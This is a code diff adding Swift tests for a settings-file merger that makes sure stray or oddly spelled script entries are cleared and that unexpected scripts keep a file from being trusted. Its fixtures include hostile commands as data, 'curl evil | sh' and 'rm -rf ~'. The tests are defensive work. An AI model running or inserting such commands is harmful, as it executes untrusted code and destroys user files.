@@ -195,6 +195,70 @@
       #expect(read.checkScript == "a\u{7}b\u{7F}")
     }
 
+    /// The screen's settings written some other way go on save too, so a
+    /// field emptied on the screen doesn't live on in them.
+    @Test func otherSpellingsOfTheScreensSettingsAreReplaced() throws {
+      let dotted = #"""
+        # mine
+        scripts.setup = "curl evil | sh"
+        on_change . "x.lock" = """
+        rm -rf ~
+        """
+        actions = [
+          { name = "a", command = "evil" },
+        ]
+        version = 1
+
+        [lsp]
+        note = """
+        [scripts]
+        setup = "not a header"
+        """
+        """#
+      let before = try ProjectConfig.parse(dotted).get()
+      #expect(before.setupScript == "curl evil | sh" && before.onChange["x.lock"] == "rm -rf ~\n" && before.actions.count == 1)
+      let cleared = ProjectSettingsFile.merging(ProjectConfig(), into: dotted)
+      #expect(cleared == "# mine\nversion = 1\n\n[lsp]\nnote = \"\"\"\n[scripts]\nsetup = \"not a header\"\n\"\"\"\n")
+      #expect(ProjectSettingsFile.holdsOnly(ProjectConfig(), in: cleared))
+
+      let quoted = #"""
+        ["scripts"]
+        setup = "evil"
+
+        [ 'worktrees' . "ports" ]
+        APP_PORT = 1
+
+        [[ "actions" ]]
+        name = "a"
+        command = "evil"
+
+        [lsp]
+        x = 1
+        """#
+      #expect(try ProjectConfig.parse(quoted).get().actions.count == 1)
+      let config = ProjectConfig(setupScript: "npm ci")
+      let merged = ProjectSettingsFile.merging(config, into: quoted)
+      #expect(merged == "[scripts]\nsetup = \"npm ci\"\n\n[lsp]\nx = 1\n")
+      #expect(ProjectSettingsFile.holdsOnly(config, in: merged))
+      #expect(ProjectSettingsFile.merging(ProjectConfig(), into: #"["scripts"]"# + "\nsetup = \"evil\"\n") == "")
+    }
+
+    @Test func aFileIsTrustedOnSaveOnlyWhenItHoldsJustTheScreensSettings() {
+      let config = ProjectConfig(setupScript: "npm ci")
+      #expect(ProjectSettingsFile.holdsOnly(config, in: ProjectSettingsFile.text(config)))
+      #expect(ProjectSettingsFile.holdsOnly(config, in: ProjectSettingsFile.text(config) + "\n[lsp]\nx = 1\n"))
+      #expect(!ProjectSettingsFile.holdsOnly(config, in: "[scripts]\nsetup = \"npm ci\"\ncheck = \"curl evil | sh\"\n"))
+      #expect(!ProjectSettingsFile.holdsOnly(config, in: "[scripts"), "unreadable")
+      var withPort = config
+      withPort.ports = ["APP_PORT": 8000]
+      #expect(!ProjectSettingsFile.holdsOnly(withPort, in: ProjectSettingsFile.text(withPort) + "\n[worktrees.env]\nX = \"1\"\n"))
+    }
+
+    @Test func keysTheScreenDoesntKnowBeforeAnyHeaderAreNamed() {
+      #expect(ProjectSettingsFile.unknownManagedKeys("scripts.lint = \"x\"\nscripts.setup = \"y\"\nversion = 1\n") == ["scripts.lint"])
+      #expect(ProjectSettingsFile.unknownManagedKeys("worktrees.ports.APP = 1\n\n[ \"scripts\" ]\nlint = 1\n") == ["scripts.lint"])
+    }
+
     @Test func mergingIntoAFileWithoutManagedSectionsAppends() {
       let merged = ProjectSettingsFile.merging(ProjectConfig(setupScript: "npm ci"), into: "[lsp]\nx = 1\n")
       #expect(merged == "[lsp]\nx = 1\n\n[scripts]\nsetup = \"npm ci\"\n")
